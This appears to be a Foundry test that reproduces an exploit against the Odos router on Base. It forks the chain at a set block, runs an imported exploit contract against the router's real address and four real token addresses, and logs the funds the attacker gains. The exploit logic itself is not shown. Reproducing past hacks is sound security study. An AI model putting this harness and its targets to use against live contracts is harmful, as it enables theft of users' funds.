// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/OdosExploit.sol";

// forge test -vvvv --fork-url https://base.drpc.org --fork-block-number 2543100 --match-test testOdosExploit
contract OdosExploitTest is Test {
    address exploiter = makeAddr("exploiter");

    function testOdosExploit() public {
        address odosRouter = 0xB6333E994Fd02a9255E794C177EfBDEB1FE779C7;

        address[] memory tokens = new address[](4);
        tokens[0] = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913; // Circle: USDC Token
        tokens[1] = 0x4200000000000000000000000000000000000006; // Wrapped Ether
        tokens[2] = 0xb33Ff54b9F7242EF1593d2C9Bcd8f9df46c77935; // FAI
        tokens[3] = 0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b; // Virtual Protocol: VIRTUAL Token

        vm.startPrank(exploiter);
        OdosExploit exploitontract = new OdosExploit();
        exploitontract.exploit(odosRouter, tokens);
        vm.stopPrank();

        console.log("Exploiter USDC balance:", IERC20(tokens[0]).balanceOf(exploiter));
        console.log("Exploiter WETH balance:", IERC20(tokens[1]).balanceOf(exploiter));
        console.log("Exploiter FAI  balance:", IERC20(tokens[2]).balanceOf(exploiter));
        console.log("Exploiter VIRTUAL balance:", IERC20(tokens[3]).balanceOf(exploiter));
    }
}
